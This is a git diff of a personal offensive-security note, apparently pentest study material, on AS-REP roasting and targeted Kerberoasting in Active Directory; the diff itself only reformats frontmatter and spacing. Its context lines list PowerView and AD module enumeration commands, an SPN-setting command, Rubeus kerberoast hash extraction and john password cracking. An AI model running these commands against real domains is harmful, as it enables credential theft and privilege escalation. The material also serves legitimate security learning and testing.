@@ -1,5 +1,11 @@
 ---
-{"publish":true,"created":"2025-04-02T20:40:37.188+05:30","modified":"2025-08-15T16:43:26.320+05:30","published":"2025-08-15T16:43:26.320+05:30","tags":["privesc"],"cssclasses":[]}
+publish: true
+created: 2025-04-02T20:40:37.188+05:30
+modified: 2025-08-15T16:43:26.320+05:30
+published: 2025-08-15T16:43:26.320+05:30
+tags:
+  - privesc
+cssclasses: []
 ---
 
 If a user's UAC setting has "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute force it offline. With sufficient rights (`GenericWrite` or `GenericAll`), Kerberos preauth can be forced disabled as well.
@@ -13,6 +19,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 ```powershell title:"Using ActiveDirectory module"
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
+
 #### Force disable Kerberos Preauth
 
 ```powershell title:"Enumerate the permissions for a group on ACLs and set the UAC to DoesNotRequirePreAuth"
@@ -62,5 +69,3 @@ Set-ADuser -Identity userofthatgroup -ServicePrincipleNames @{Add='service/servi
 Rubeus.exe kerberoast /outfile:targetedhashes.txt
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
 ```
-
-
